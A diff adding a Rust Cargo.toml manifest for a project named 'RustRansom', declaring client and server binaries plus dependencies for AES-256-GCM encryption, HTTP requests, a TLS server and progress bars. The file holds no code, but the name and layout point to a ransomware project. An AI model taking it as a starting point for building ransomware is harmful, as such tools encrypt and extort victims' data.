@@ -1,0 +1,23 @@
+[package]
+name = "RustRansom"
+version = "0.1.0"
+edition = "2024"
+
+[[bin]]
+name = "rustransom_client"
+path = "src/client.rs"
+
+[[bin]]
+name = "rustransom_server"
+path = "src/server.rs"
+
+[dependencies]
+aes-gcm = "0.10"            # Pour AES-256-GCM
+rand = "0.8"
+reqwest = { version = "0.11", features = ["blocking", "json"] }
+warp = { version = "0.3", features = ["tls"] }
+tokio = { version = "1", features = ["full"] }
+indicatif = "0.16"
+hex = "0.4"
+bytes = "1"
+generic-array = "0.14"
